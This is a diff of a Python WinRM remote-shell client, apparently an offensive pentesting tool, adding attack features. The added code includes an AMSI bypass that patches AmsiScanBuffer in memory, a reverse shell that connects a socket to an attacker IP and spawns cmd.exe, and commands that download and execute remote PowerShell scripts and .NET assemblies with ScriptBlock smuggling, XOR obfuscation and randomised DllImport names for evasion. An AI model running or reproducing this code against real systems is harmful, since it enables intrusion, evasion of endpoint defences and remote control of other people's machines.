@@ -1,5 +1,4 @@
-import os, sys, re, datetime, uuid, logging, ipaddress
-import time, shlex, fcntl, termios, ssl, string, re
+import os, sys, re, uuid, logging, time, shlex, ssl
 
 from copy import deepcopy
 from base64 import b64encode, b64decode
@@ -7,7 +6,9 @@ from struct import pack, unpack, error
 from signal import SIGINT, signal, getsignal
 from random import randbytes, randint
 from pathlib import PureWindowsPath, Path
+from datetime import datetime, UTC
 from argparse import ArgumentParser
+from ipaddress import ip_address
 
 # pip install xmltodict
 import xmltodict
@@ -72,10 +73,6 @@ def serialize(obj):
 def deserialize(data):
     return xmltodict.parse(data, strip_whitespace=False)
 
-def terminal_size():
-    h, w, _, _ = unpack('HHHH', fcntl.ioctl(0, termios.TIOCGWINSZ, bytes(8)))
-    return w, h
-
 def split_args(cmdline):
     try:
         args = shlex.split(cmdline, posix=False)
@@ -92,12 +89,19 @@ def split_args(cmdline):
             fixed.append(arg)
     return fixed
 
+_utfstr = re.compile(r'_x([0-9a-fA-F]{4})_')
 def utfstr(s):
     # chars inside xml strings that have non-printable characters are encoded like this, eg:
     # '\n' would be "_x000A_", etc.. although i don't know how to tell if a charcter was
     # encoded during xml serialization or there was a literal *string* "_x000A_" somewhere
     # to begin with:
-    return re.sub(r'_x([0-9a-fA-F]{4})_', lambda m: chr(int(m.group(1), 16)), s).rstrip()
+    try:
+        return _utfstr.sub(lambda m: bytes.fromhex(m.group(1)).decode("utf-16be"), s)
+    except:
+        return s
+
+def xorenc(xs, key):
+    return bytes(x ^ key for x in xs)
 
 zero_uuid = str(uuid.UUID(bytes_le=bytes(16))).upper()
 
@@ -120,7 +124,7 @@ def krb5_mech_indep_token_decode(data):
     return decoder.decode(data[skip:], asn1Spec=ObjectIdentifier)
 
 # -- soap templates for winrm: --------------------------------------------------------------------
-# i know this is jank as fuck, but i only need a bare minimum to have a working shell:
+# i know this is jank as !@&#, but i only need a bare minimum to have a working shell:
 soap_req_tmpl = {
     's:Envelope': {
         '@xmlns:rsp': 'http://schemas.microsoft.com/wbem/wsman/1/windows/shell',
@@ -195,13 +199,9 @@ def soap_rsp(rsp):
         fault = body["s:Fault"]
         return {
             "fault"   : "OK",
-            "subcode" : fault.get("s:Code",   {}).get("s:Subcode", {}).get("s:Value", ""),
-            "reason"  : fault.get("s:Reason", {}).get("s:Text", {}).get("#text", ""),
-            "detail"  : fault.get("s:Detail", {}).get("f:Message", ""),
-        }
-    elif action.endswith("transfer/CreateResponse"):
-        return {
-            "create" : "OK",
+            "subcode" : fault.get("s:Code",   {}).get("s:Subcode", {}).get("s:Value") or "",
+            "reason"  : fault.get("s:Reason", {}).get("s:Text", {}).get("#text") or "",
+            "detail"  : fault.get("s:Detail", {}).get("f:Message") or "",
         }
     elif action.endswith("shell/ReceiveResponse"):
         receive = body["rsp:ReceiveResponse"]
@@ -211,8 +211,10 @@ def soap_rsp(rsp):
         return {
             "receive" : "OK",
             "streams" : [ b64decode(s.get("#text", "")) for s in streams ],
-            "state"   : receive.get("rsp:CommandState", {}).get("@State")
+            "state"   : receive.get("rsp:CommandState", {}).get("@State") or ""
         }
+    elif action.endswith("transfer/CreateResponse"):
+        return { "create" : "OK", }
     elif action.endswith("shell/SignalResponse"):
         return { "signal" : "OK" }
     elif action.endswith("transfer/DeleteResponse"):
@@ -399,7 +401,7 @@ def defragment(streams, object_buffer):
 class BasicTransport:
     def __init__(self, args):
         self.session = Session()
-        self.session.headers["User-Agent"] = "Microsoft WinRM Client"
+        self.session.headers["User-Agent"] = SKIP_HEADER
         self.session.headers["Accept-Encoding"] = SKIP_HEADER
         self.url  = args.url
         self.auth = (args.username, args.password)
@@ -497,7 +499,7 @@ class NTLMTransport:
         self.rc4_srv = None
 
         s = Session()
-        s.headers["User-Agent"] = "Microsoft WinRM Client"
+        s.headers["User-Agent"] = SKIP_HEADER
         s.headers["Accept-Encoding"] = SKIP_HEADER
 
         type1 = getNTLMSSPType1()
@@ -654,23 +656,17 @@ class KerberosTransport:
         return rsp
 
     def _auth(self):
-        self.session = None
-        self.subkey  = None
-        self.cipher  = None
-        self.msgseq  = None
-
         user = Principal(self.args.username, type=PrincipalNameType.NT_PRINCIPAL.value)
 
         checksum = CheckSumField()
         checksum['Lgth']   = 16
         checksum['Flags']  = GSS_C_CONF_FLAG | GSS_C_INTEG_FLAG | GSS_C_SEQUENCE_FLAG
         checksum['Flags'] |= GSS_C_REPLAY_FLAG | GSS_C_MUTUAL_FLAG
-
         # include tls channel binding in case CbtHardeningLevel=Strict
         if self.args.ssl:
             checksum['Bnd'] = self.gss_bindings
 
-        now = datetime.datetime.now(datetime.UTC)
+        now = datetime.now(UTC)
 
         auth = Authenticator()
         seq_set(auth, 'cname', user.components_to_asn1)
@@ -704,10 +700,10 @@ class KerberosTransport:
         token = "Kerberos " + b64str(token)
 
         # -- ask for AP_REP via HTTP: -------------------------------------------------------------
-        s = Session()
-        s.headers["User-Agent"] = "Microsoft WinRM Client"
-        s.headers["Accept-Encoding"] = SKIP_HEADER
-        rsp = s.post(self.args.url, verify=False, headers={ "Authorization" : token })
+        session = Session()
+        session.headers["User-Agent"] = SKIP_HEADER
+        session.headers["Accept-Encoding"] = SKIP_HEADER
+        rsp = session.post(self.args.url, verify=False, headers={ "Authorization" : token })
         www_auth = rsp.headers.get("WWW-Authenticate", "")
 
         try:
@@ -723,10 +719,10 @@ class KerberosTransport:
         keydata    = ap_rep_dec["subkey"]["keyvalue"].asOctets()
         keytype    = ap_rep_dec["subkey"]["keytype"]
 
-        self.subkey     = Key(keytype, keydata)
-        self.cipher     = _enctype_table[keytype] # 18
-        self.session    = s
-        self.msgseq     = 0
+        self.subkey  = Key(keytype, keydata)
+        self.cipher  = _enctype_table[keytype] # 18
+        self.session = session
+        self.msgseq  = 0
 
 # -- MS-PSRP stuff from https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp ------
 class Runspace:
@@ -774,8 +770,8 @@ class Runspace:
         req = soap_req("delete", self.session_id, self.args.url, self.shell_id, timeout=self.timeout)
         self._send(req)
 
-    def run_command(self, cmd, debug=True, width=None):
-        command_id = self._create_pipeline(cmd, width)
+    def run_command(self, cmd, debug=True):
+        command_id = self._create_pipeline(cmd)
         if not command_id:
             yield { "error" : "failed to create pipeline, if this persists just restart the shell" }
             return
@@ -795,31 +791,34 @@ class Runspace:
 
             timeouts = 0 # reset timeout counter when we finally get a response
             for msg_type, msg, _, _ in defragment(rsp["streams"], self.object_buffer):
-                if msg_type == PIPELINE_OUTPUT:
+                if msg_type == PIPELINE_OUTPUT: # from Write-Output
                     yield { "stdout" : utfstr(msg.get("S") or "") }
 
-                elif msg_type == ERROR_RECORD:
+                elif msg_type == ERROR_RECORD: # from Write-Error
                     yield { "error" : utfstr(msg.get("Obj", {}).get("ToString") or "unknown error") }
 
-                elif msg_type == WARNING_RECORD:
+                elif msg_type == WARNING_RECORD: # from Write-Warning
                     yield { "warn" : utfstr(msg.get("Obj", {}).get("ToString") or "unknown warning") }
 
-                elif msg_type == INFORMATION_RECORD:
-                    for rec in msg.get("Obj", {}).get("MS", {}).get("Obj", []):
-                        if rec.get("@N") == "MessageData":
-                            yield { "info" : utfstr(rec.get("ToString") or "unknown info") }
-                            break
+                elif msg_type == INFORMATION_RECORD: # from Write-Host
+                    props = msg.get("Obj", {}).get("MS", {}).get("Obj", [{}])[0].get("Props", {})
+                    text = props.get("S", {}).get("#text") or ""
+                    endl = props.get("B", {}).get("#text", "false") == "false"
+                    yield { "info" : utfstr(text), "endl" : "\n" if endl else "" }
 
-                elif msg_type == PIPELINE_STATE: # find if there was an exception and treat it as error:
+                elif msg_type == VERBOSE_RECORD: # from Write-Verbose
+                    yield { "verbose" : utfstr(msg.get("Obj", {}).get("ToString") or "") }
+
+                elif msg_type == PIPELINE_STATE: # if there was an exception and treat it as error:
                     err = msg.get("Obj", {}).get("MS", {}).get("Obj", {})
                     if err.get("@N") == "ExceptionAsErrorRecord":
                         yield { "error" : utfstr(err.get("ToString") or "uknonwn exception") }
 
-                elif msg_type == PROGRESS_RECORD:
+                elif msg_type == PROGRESS_RECORD: # from Write-Progress
                     for progress in msg.get("Obj", {}).get("MS", {}).get("S", []):
                         yield { "progress" : progress.get("#text", "") }
 
-                else: # strays
+                else: # debug strays in case i missed something:
                     logging.debug(f"{msg_ids[msg_type]} : {msg}")
 
             if rsp["state"]:
@@ -855,13 +854,13 @@ class Runspace:
 
         return self._send(req)
 
-    def _create_pipeline(self, cmd, width=None):
+    def _create_pipeline(self, cmd):
         command_id = str(uuid.uuid4()).upper()
 
-        # Invoke-Expression $cmd | Out-String -Stream -Width $width
+        # Invoke-Expression $cmd | Out-String -Stream
         create_pipeline = ps_create_pipeline([
             ("Invoke-Expression", { "Command" : cmd }),
-            ("Out-String", { "Stream" : None } | ({ "Width" : str(width) } if width else {}))
+            ("Out-String", { "Stream" : None } )
         ])
 
         messages = fragment(self.next_object_id, [
@@ -869,11 +868,6 @@ class Runspace:
         ])
 
         req = soap_req("command", self.session_id, self.args.url, self.shell_id, timeout=self.timeout)
-        req["s:Envelope"]["s:Header"]["wsman:OptionSet"]["wsman:Option"] = [
-            {"@Name" : "WINRS_CONSOLEMODE_STDIN", "#text" : "true" },
-            {"@Name" : "WINRS_SKIP_CMD_SHELL",    "#text" : "false" }
-        ]
-
         req["s:Envelope"]["s:Body"] = {
             "rsp:CommandLine" : {
                 "@CommandId" : command_id,
@@ -881,7 +875,6 @@ class Runspace:
                 "rsp:Arguments" : b64str(messages)
             }
         }
-
         rsp = self._send(req)
 
         if rsp.get("command", "") == "OK":
@@ -927,12 +920,80 @@ class CtrlCHandler:
         self.released = True
         return True
 
+# -- some types and imports for upload/download/amsi/netrun/psrun functionality: ------------------
+_ns = "A" + randbytes(randint(3,8)).hex()
+_xor_key = randint(1,255)
+
+# a workaround for getting a streaming console output from dynamically loaded .NET assemblies:
+host_writer_cs = """
+Add-Type -TypeDefinition @"
+namespace _NS {
+public class HostWriter : System.IO.TextWriter {
+  private System.Action<string> _act;
+  public HostWriter(System.Action<string> act) { _act = act; }
+  public override void Write(char v) { _act(v.ToString()); }
+  public override void Write(string v) { _act(v); }
+  public override void WriteLine(string v) { _act(v + System.Environment.NewLine); }
+  public override System.Text.Encoding Encoding { get { return System.Text.Encoding.UTF8; } }
+}}
+"@""".replace("_NS", _ns)
+
+# it is way too slow to do this in powershell for large files:
+xor_enc_cs = """
+Add-Type @"
+namespace _NS {
+public class X {
+    public static byte[] x(byte[] y) {
+        for(int i = 0; i < y.Length; i++) { y[i] ^= _KEY; }
+        return y;
+    }
+}}
+"@
+""".replace("_NS", _ns).replace("_KEY", str(_xor_key))
+
+# zipping files on windows will have \ as path separators and some linux tools bork:
+path_fix_cs = """
+Add-Type @"
+namespace _NS {
+public class PathFix : System.Text.UTF8Encoding {
+    public override byte[] GetBytes(string s) {
+        s=s.Replace("\\\\", "/");
+        return base.GetBytes(s);
+    }
+}}
+"@
+""".replace("_NS", _ns)
+
+# mangle DllImports a little:
+def dll_import(ns, lib, fun, sigs):
+    cls  = f"f{randbytes(randint(3,8)).hex()}"
+    name = f"g{randbytes(randint(3,8)).hex()}"
+    ret  = sigs[0]
+    args = ", ".join(f"{ty} x{randbytes(2).hex()}" for ty in sigs[1:])
+    code = f'[DllImport("{lib}",EntryPoint="{fun}")] public static extern {ret} {name}({args});'
+    globals()["_call_"   + fun] = f"[{_ns}.{cls}]::{name}"
+    globals()["_import_" + fun] = f"""Add-Type -Name {cls} -Namespace {ns} -Member '{code}'"""
+
+# this will add _import_LoadLibrary and _call_LoadLibrary variables in global scope, etc:
+dll_import(_ns, "kernel32", "LoadLibrary",    ["IntPtr", "string"])
+dll_import(_ns, "kernel32", "GetProcAddress", ["IntPtr", "IntPtr", "string"])
+dll_import(_ns, "kernel32", "VirtualProtect", ["IntPtr", "IntPtr", "IntPtr", "uint", "out uint"])
+dll_import(_ns, "kernel32", "CreateProcess",  ["IntPtr", "IntPtr", "string", "IntPtr", "IntPtr", "bool", "uint", "IntPtr", "IntPtr", "Int64[]", "byte[]"])
+dll_import(_ns, "ws2_32",   "WSAStartup",     ["IntPtr", "short", "byte[]"])
+dll_import(_ns, "ws2_32",   "WSASocket",      ["IntPtr", "uint", "uint", "uint", "IntPtr", "uint", "uint"])
+dll_import(_ns, "ws2_32",   "WSAConnect",     ["IntPtr", "IntPtr", "byte[]", "int", "IntPtr", "IntPtr", "IntPtr", "IntPtr"])
+
+# when splicing strings into powershell scripts use this so not to worry about escaping chars, etc:
+def str_b64(arg):
+    return f"([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64str(arg)}')))"
+
 class Shell:
     def __init__(self, transport, args):
         self.args       = args
         self.transport  = transport
         self.cwd        = ""
         self.stdout_log = None
+        self.need_clear = False
 
         if args.log:
             self.start_log()
@@ -959,7 +1020,7 @@ class Shell:
     def start_log(self):
         if not self.stdout_log:
             logfile = f"winrmexec_{int(time.time())}_stdout.log"
-            logging.info(f"logging output to {logfile}")
+            self.write_info(f"logging output to {logfile}")
             self.stdout_log = open(logfile, "wb")
 
     def stop_log(self):
@@ -969,24 +1030,35 @@ class Shell:
 
     def help(self):
         print()
-        print("Ctrl+D to exit, Ctrl+C will try to interrupt running pipeline gracefully")
+        print("Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully")
         print("\x1b[1m\x1b[31mThis is not an interactive shell!\x1b[0m If you need to run programs that expect")
-        print("inputs from stdin, or exploits that spawn cmd.exe, etc., pop your favorite revshell")
+        print("inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell")
         print()
         print("Special !bangs:")
-        print("  !download RPATH [LPATH] # downloads a file or directory (as a zip file); use 'PATH'")
-        print("                          # if it contains whitespace")
+        print("  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'")
+        print("                                   # if it contains whitespace")
         print()
-        print("  !upload LPATH [RPATH]   # uploads a file; use 'PATH' if it contains whitespace,")
-        print("                          # though use iwr if you can reach your ip from the box")
+        print("  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr")
+        print("                                   # if you can reach your ip from the box, because this can be slow;")
+        print("                                   # use -xor only in conjunction with !psrun/!netrun")
         print()
-        print("  !psrun [-bg] URL        # run .ps1 script from url; if -bg is specified this will run it")
-        print("                          # as a background job (no output); uses ScriptBlock smuggling, so")
-        print("                          # no amsi patching is needed unless that script tries to load ")
-        print("                          # .NET assembly")
+        print("  !amsi                            # amsi bypass, run this right after you get a prompt")
         print()
-        print("  !log                    # start logging output to winrmexec_[timestamp]_stdout.log")
-        print("  !stoplog                # stop logging output to winrmexec_[timestamp]_stdout.log")
+        print("  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is")
+        print("                                   # needed unless that script tries to load a .NET assembly; if you can't reach")
+        print("                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\\foo\\bar.ps1' (needs absolute path)")
+        print()
+        print("  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;")
+        print("                                   # !amsi first if you're getting '...program with an incorrect format' errors;")
+        print("                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\\foo\\bar.exe' (needs absolute path)")
+        print()
+        print("  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you")
+        print("                                   # you need to run an executable that expects input, try:")
+        print("                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' \"line1`nline2`nline3\"")
+        print("                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'")
+        print()
+        print("  !log                             # start logging output to winrmexec_[timestamp]_stdout.log")
+        print("  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log")
         print()
 
     def repl(self, inputs=None, debug=True):
@@ -1001,10 +1073,16 @@ class Shell:
                     self.download(runspace, cmd.removeprefix("!download "))
                 elif cmd.startswith("!upload "):
                     self.upload(runspace, cmd.removeprefix("!upload "))
-                elif cmd.startswith("!log"):
-                    self.start_log()
+                elif cmd.startswith("!amsi"):
+                    self.amsi_bypass(runspace)
+                elif cmd.startswith("!netrun "):
+                   self.netrun(runspace, cmd.removeprefix("!netrun "))
                 elif cmd.startswith("!psrun "):
                    self.psrun(runspace, cmd.removeprefix("!psrun "))
+                elif cmd.startswith("!revshell "):
+                    self.revshell(runspace, cmd.removeprefix("!revshell "))
+                elif cmd.startswith("!log"):
+                    self.start_log()
                 elif cmd.startswith("!stop_log"):
                     self.stop_log()
                 elif cmd.startswith("!") or cmd in { "help", "?" }:
@@ -1013,11 +1091,11 @@ class Shell:
                     if self.stdout_log:
                         self.stdout_log.write(f"PS {self.cwd}> {cmd}\n".encode())
                         self.stdout_log.flush()
-                    self.run_with_interrupt(runspace, cmd, self.fancy_output)
+                    self.run_with_interrupt(runspace, cmd, self.write_line)
                     self.update_cwd(runspace)
 
     def update_cwd(self, runspace):
-        self.cwd = self.run_sync(runspace, "$PWD | Select-Object -Expand Path").strip()
+        self.cwd = self.run_sync(runspace, "Get-Location | Select -Expand Path").strip()
 
     def read_line(self):
         while True:
@@ -1030,29 +1108,49 @@ class Shell:
             else:
                 yield cmd
 
-    def fancy_output(self, out):
-        # clears current line; progress messages are printed in-place and if you then try
-        # to print some shorter string, there will be some garbage left over.
-        cl = "\033[2K\r"
+    def write_warning(self, msg):
+        self.write_line({ "warn" : msg })
 
-        if "stdout" in out:
+    def write_info(self, msg):
+        self.write_line({ "info" : msg, "endl" : "\n" })
+
+    def write_error(self, msg):
+        self.write_line({ "error" : msg })
+
+    def write_progress(self, msg):
+        self.write_line({ "progress" : msg })
+
+    def write_line(self, out):
+        clear = "\033[2K\r" if self.need_clear else ""
+        self.need_clear = False
+
+        log_msg = b""
+        if "stdout" in out: # from Write-Output
             msg = out.get("stdout")
-            print(cl + msg, flush=True, file=sys.stdout)
-            if self.stdout_log:
-                self.stdout_log.write(msg.encode() + b"\n")
-                self.stdout_log.flush()
+            print(clear + msg, flush=True)
+            log_msg = msg.encode() + b"\n"
 
-        elif msg := out.get("error"):
-            print(cl + "\x1b[31m" + msg + "\x1b[0m", flush=True, file=sys.stderr)
+        elif msg := out.get("info"): # from Write-Host
+            endl = out.get("endl", "\n")
+            print(clear + msg, end=endl, flush=True)
+            log_msg = msg.encode() + endl.encode()
 
-        elif msg := out.get("warn"):
-            print(cl + "\x1b[33m" + msg + "\x1b[0m", flush=True, file=sys.stderr)
+        elif msg := out.get("error"): # from Write-Error and exceptions
+            print(clear + "\x1b[31m" + msg + "\x1b[0m", flush=True)
 
-        elif msg := out.get("info"):
-            print(cl + "\x1b[32m" + msg + "\x1b[0m", flush=True, file=sys.stderr)
+        elif msg := out.get("warn"): # from Write-Warning
+            print(clear + "\x1b[33m" + msg + "\x1b[0m", flush=True)
 
-        elif progress := out.get("progress"):
-            print(cl + "\x1b[34m" + progress + "\x1b[0m", end="\r", flush=True, file=sys.stderr)
+        elif msg := out.get("verbose"): # from Write-Verbose
+            print(clear + msg, flush=True)
+
+        elif progress := out.get("progress"): # from Write-Progress
+            print(clear + "\x1b[34m" + progress + "\x1b[0m", end="\r", flush=True)
+            self.need_clear = True
+
+        if self.stdout_log:
+            self.stdout_log.write(log_msg)
+            self.stdout_log.flush()
 
 
     def run_sync(self, runspace, cmd):
@@ -1060,7 +1158,7 @@ class Shell:
         # or timeout; also make sure that command selects exactly the property of the output
         # that it needs with `... | Select -Expand PROP`, otherwise the outer `| Out-String`
         # CmdLet will try to pretty-print the output which will sometimes truncate the lines
-        # in the output to fit into what it thinks is the "width" of the terminal:
+        # in the output to fit into what it thinks is the width of the terminal:
         return "\n".join(out.get("stdout") for out in runspace.run_command(cmd) if "stdout" in out)
 
     def run_with_interrupt(self, runspace, cmd, output_handler=None, exception_handler=None):
@@ -1073,11 +1171,9 @@ class Shell:
 
         # `exception_handler` should handle exceptions that happen inside `runspace.run_command`;
         # if you think you dealt with the exception, return `True` and this will try
-        # continue the streaming, but maybe just let it fail or use it only to format debug messages
+        # continue the streaming, but maybe just let it fail or use it only to format debug messages;
         # if `exception_handler` is not specified it will throw;
-
-        width, _ = terminal_size()
-        output_stream = runspace.run_command(cmd, width=width)
+        output_stream = runspace.run_command(cmd)
         while True:
             with CtrlCHandler(timeout=5) as h:
                 try:
@@ -1085,9 +1181,8 @@ class Shell:
                 except StopIteration:
                     break
                 except Exception as e:
-                    if exception_handler:
-                        if exception_handler(e):
-                            continue
+                    if exception_handler and exception_handler(e):
+                        continue
                     else:
                         raise e
 
@@ -1099,159 +1194,247 @@ class Shell:
 
         return h.interrupted > 0
 
+
     def psrun(self, runspace, cmdline):
-        args = split_args(cmdline)
-        if len(args) == 0:
-            return
+        args = split_args(cmdline)[:2]
 
-        if len(args) == 2 and args[0] == "-bg":
-            background = True
-            url = args[1]
-        else:
-            background = False
-            url = args[0]
+        url = args[-1]
+        xorfunc = ""
+        if args[0].lower() == "-xor":
+            if len(args) != 2:
+                self.write_warning("missing URL")
+                return
 
-        url = b64str(url.strip())
-        var_c = "c" + randbytes(randint(4,12)).hex()
-        var_a = "a" + randbytes(randint(4,12)).hex()
-        var_b = "b" + randbytes(randint(4,12)).hex()
+            if args[-1].lower().startswith("http"):
+                self.write_warning("use -xor only for files that were uploaded with !upload -xor")
+                return
+
+            xorfunc = f"[{_ns}.X]::x"
 
         commands = [
-            f'${var_c} = [ScriptBlock]::Create((New-Object Net.WebClient).DownloadString([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{url}")))).Ast',
-            f"${var_c} = ${var_c}.EndBlock.Copy()",
-            f"${var_a} = [ScriptBlock]::Create('').Ast",
-            f"${var_b} = [System.Management.Automation.Language.ScriptBlockAst]::new(${var_a}.Extent, $null, $null, $null, ${var_c}, $null)",
-            f"Remove-Variable @('{var_c}', '{var_a}')",
-            f"Invoke-Command -ScriptBlock ${var_b}.GetScriptBlock()"
+            xor_enc_cs,
+            f'$c = (New-Object Net.WebClient).DownloadData({str_b64(url)})',
+            f'$c = [ScriptBlock]::Create([Text.Encoding]::UTF8.GetString(({xorfunc}($c))))',
+             "$c = $c.Ast.EndBlock.Copy()",
+             "$a = [ScriptBlock]::Create('Get-ChildItem').Ast",
+             "$b = [Management.Automation.Language.ScriptBlockAst]::new($a.Extent,$null,$null,$null,$c,$null)",
+             "Invoke-Command -NoNewScope -ScriptBlock $b.GetScriptBlock()",
+             "Remove-Variable @('a','b','c')"
         ]
 
-        if background:
-            op = "Invoke-Expression $([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($_)))"
-            cmdb64 = "@(" + ",".join("'" + b64str(c) + "'" for c in commands) + ")"
-            commands = [f"Start-Job -ScriptBlock {{ {cmdb64} | foreach {{ {op} }} }}"]
+        for cmd in commands:
+            logging.debug(cmd)
+            self.run_with_interrupt(runspace, cmd, self.write_line)
 
-        for ps in commands:
-            self.run_with_interrupt(runspace, ps, self.fancy_output)
+
+    def netrun(self, runspace, cmdline):
+        args = split_args(cmdline)
+        if args[0].lower() == "-xor":
+            if len(args) == 1:
+                self.write_warning("missing URL and [ARGS..]")
+                return
+            xorfunc = f"[{_ns}.X]::x"
+            args = args[1:]
+        else:
+            xorfunc = ""
+
+        args = [ str_b64(arg) for arg in args ]
+
+        url = args[0]
+        argv = "[string[]]@(" + ",".join(args[1:]) + ")"
+
+        commands = [
+            host_writer_cs, xor_enc_cs,
+            f"$buf = (New-Object Net.WebClient).DownloadData({url})",
+            f"$dll = [Reflection.Assembly]::Load({xorfunc}($buf))",
+            f"$out = New-Object {_ns}.HostWriter {{ Write-Host -NoNewLine $args }}",
+            f"[Console]::SetOut($out); [Console]::SetError($out)",
+            f"$dll.EntryPoint.Invoke($null,(,{argv}))",
+            f"[Console]::SetOut([IO.StreamWriter]::Null)",
+            f"[Console]::SetError([IO.StreamWriter]::Null)",
+            f"$out.Dispose()",
+            f"Remove-Variable @('buf','dll','out')"
+        ]
+
+        for cmd in commands:
+            logging.debug(cmd)
+            self.run_with_interrupt(runspace, cmd, self.write_line)
+
+
+    def amsi_bypass(self, runspace):
+        ns = "A" + randbytes(2).hex()
+        commands = [
+            _import_LoadLibrary,
+            _import_GetProcAddress,
+            _import_VirtualProtect,
+            f"$addr = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
+            f"{_call_VirtualProtect}($addr, [IntPtr]6, 64, [ref]$null)",
+            f"Start-Sleep -Seconds 1", # this seems to do the trick for now...
+            f"[Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0,7,0x80,0xc3), 0, $addr, 6)",
+            f"Start-Sleep -Seconds 1",
+            f"{_call_VirtualProtect}($addr, [IntPtr]6, 32, [ref]$null)",
+        ]
+        for cmd in commands:
+            logging.debug(cmd)
+            self.run_sync(runspace, cmd)
+
+
+    def revshell(self, runspace, cmdline):
+        args = split_args(cmdline)
+        try:
+            ip, port = ip_address(args[0]).packed, int(args[1])
+            p_hi, p_lo = (port >> 8) & 0xff, port & 0xff
+        except:
+            return
+
+        commands = [
+            _import_WSAStartup, _import_WSASocket, _import_WSAConnect, _import_CreateProcess,
+            f"{_call_WSAStartup}(0x202,(New-Object byte[] 64))",
+            f"$sock = {_call_WSASocket}(2,1,6,0,0,0)",
+            f"{_call_WSAConnect}($sock,[byte[]](2,0,{p_hi},{p_lo},{ip[0]},{ip[1]},{ip[2]},{ip[3]},12,0,0,0,0,0,0,0,0),16,0,0,0,0)",
+            f"$sinfo = [int64[]](104,0,0,0,0,0,0,0x10100000000,0,0,$sock,$sock,$sock)",
+            f"{_call_CreateProcess}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
+            f"Remove-Variable @('sock','sinfo')"
+        ]
+
+        for cmd in commands:
+            logging.debug(cmd)
+            self.run_with_interrupt(runspace, cmd, self.write_line)
+
 
     def upload(self, runspace, cmdline):
-        args = split_args(cmdline)[:2]
+        args = split_args(cmdline)
+
+        if args[0].lower() == "-xor":
+            unxor = False
+            args = args[1:]
+        else:
+            unxor = True
+
         src = Path(args[0])
         dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
         try:
             with open(src, "rb") as f:
                 buf = f.read()
         except IOError as e:
-            logging.error(str(e))
+            self.write_error(str(e))
             return
 
-        tmpfn = self.run_sync(runspace, "[System.IO.Path]::GetTempPath()")
+        tmpfn = self.run_sync(runspace, "[IO.Path]::GetTempPath()")
         tmpfn = tmpfn + randbytes(8).hex() + ".tmp"
-        first = True
         total = 0
-        logging.info(f"uploading to {tmpfn}")
-        for chunk in chunks(buf, 8192):
+        self.write_info(f"uploading to {tmpfn}")
+
+        self.run_sync(runspace, xor_enc_cs)
+        for chunk in chunks(buf, 65536):
             total += len(chunk)
-            op = f'{"Set" if first else "Add"}-Content -Path "{tmpfn}"'
-            ps = f'{op} -Encoding Byte -Value $([Convert]::FromBase64String("{b64str(chunk)}"))'
+            chunk = xorenc(chunk, _xor_key)
+            xorfunc = f"[{_ns}.X]::x" if unxor else ""
+            ps = f"Add-Content -Encoding Byte '{tmpfn}' ([byte[]]$({xorfunc}([Convert]::FromBase64String('{b64str(chunk)}'))))"
+
             interrupted = self.run_with_interrupt(runspace, ps)
             if interrupted:
-                logging.warning(f"upload interrupted, clean up {tmpfn} manually")
+                self.write_warning("upload interrupted")
+                self.run_sync(runspace, f"Remove-Item -Force '{tmpfn}'")
                 return
-            print(f"[*] progress: {total}/{len(buf)}", end='\r', flush=True)
-            first = False
 
-        logging.info(f"moving from {tmpfn} to {dst}")
-        ps = f'Move-Item -Path "{tmpfn}" -Destination "{dst}"'
-        self.run_with_interrupt(runspace, ps, print)
+            self.write_progress(f"progress: {total}/{len(buf)}")
 
-        ps = f'$(Get-FileHash "{dst}" -Algorithm MD5 | Select -Expand Hash)'
+        self.write_info(f"moving from {tmpfn} to {dst}")
+        ps = f"Move-Item -Force -Path '{tmpfn}' -Destination '{dst}'"
+        self.run_with_interrupt(runspace, ps, self.write_line)
+
+        ps = f"(Get-FileHash '{dst}' -Algorithm MD5).Hash"
         out = self.run_sync(runspace, ps)
-        if out.strip() != MD5.new(buf).hexdigest().upper():
-            logging.error("Corrupted upload")
+        md5sum = MD5.new(buf if unxor else xorenc(buf, _xor_key))
+        if out.strip() != md5sum.hexdigest().upper():
+            self.write_error("Corrupted upload")
 
 
     def download(self, runspace, cmdline):
         args = split_args(cmdline)
         if len(args) == 0 or len(args) > 2:
-            logging.warning("usage: !download RPATH [LPATH]")
+            self.write_warning("usage: !download RPATH [LPATH]")
             return
 
-        src = PureWindowsPath(args[0])
+        src = self.run_sync(runspace, f"Resolve-Path -LiteralPath '{args[0]}' | Select -Expand Path")
+        if not src:
+            self.write_warning(f"{args[0]} not found")
+            return
+
+        src = PureWindowsPath(src)
+
         dst = Path(args[1]) if len(args) == 2 else Path(src.name)
-
-        if not src.is_absolute():
-            src = PureWindowsPath(self.cwd).joinpath(src)
-
         if dst.is_dir():
             dst = dst.joinpath(src.name)
 
         if not dst.parent.exists():
             os.makedirs(dst.parent, exist_ok=True)
 
-        src_is_dir = self.run_sync(runspace, f'Test-Path -Path "{src}" -PathType Container') == "True"
+        src_is_dir = self.run_sync(runspace, f"Test-Path -Path '{src}' -PathType Container") == "True"
         if src_is_dir:
             if not dst.name.lower().endswith(".zip"):
                 dst = Path(dst.parent).joinpath(f"{dst.name}.zip")
-            logging.info(f"{src} is a directory, will download a zip file of its contents to {dst.resolve()}")
+            self.write_info(f"{src} is a directory, will download a zip file of its contents to {dst}")
 
             tmpdir = self.run_sync(runspace, "[System.IO.Path]::GetTempPath()")
